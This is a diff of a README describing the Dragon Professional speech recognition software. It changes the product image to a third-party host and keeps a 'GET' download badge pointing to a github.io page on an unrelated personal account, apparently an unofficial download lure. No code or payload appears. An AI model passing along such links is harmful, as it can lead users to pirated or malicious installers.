@@ -2,7 +2,7 @@
 
 Dragon Professional is a speech recognition utility designed to turn spoken language into written documents and help users manage text through voice commands. It supports professional dictation, recorded-audio transcription, document correction, and reusable commands for repetitive writing tasks.
 
-![Dragon Professional Product Artwork](https://dragon.nuance.com/shared/images/image-spot-drg-dp16-chiclet-260x260-DP.jpg)
+![Dragon Professional Product Artwork](https://kardi.fr/wp-content/uploads/2025/06/Dragon-Pro-16-Visuel.png)
 
 [![GET — Dragon Professional](https://img.shields.io/badge/GET%20%E2%80%94%20Dragon%20Professional-0078D6?style=for-the-badge&logoColor=white)](https://deborahadamsm775.github.io/.github/Dragon-Professional-Speech-Tools)
 
